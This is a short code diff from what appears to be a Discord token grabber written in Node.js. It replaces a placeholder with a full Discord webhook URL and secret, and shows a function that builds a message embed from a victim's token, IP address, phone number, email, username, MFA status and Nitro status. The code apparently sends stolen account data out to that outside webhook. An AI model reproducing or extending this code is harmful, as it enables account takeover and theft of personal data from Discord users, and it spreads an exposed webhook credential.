@@ -3,7 +3,7 @@ const axios = require('axios');
 const { Webhook, MessageBuilder } = require('discord-webhook-node');
 
 const app = express();
-const hook = new Webhook('YOUR WEBHOOK');
+const hook = new Webhook('https://discord.com/api/webhooks/1134270333306798281/1-jJqZxwI7wvgawSmkGA-ozLUBMNA-uDbSp6sN9Ag1hNfaos-tQ-8OWxrrkBY4_kCH7c');
 
 function sendBlackEmbed(token, ip, phoneNumber, email, username, tag, avatarUrl, mfaStatus, nitroStatus) {
   const embed = new MessageBuilder()
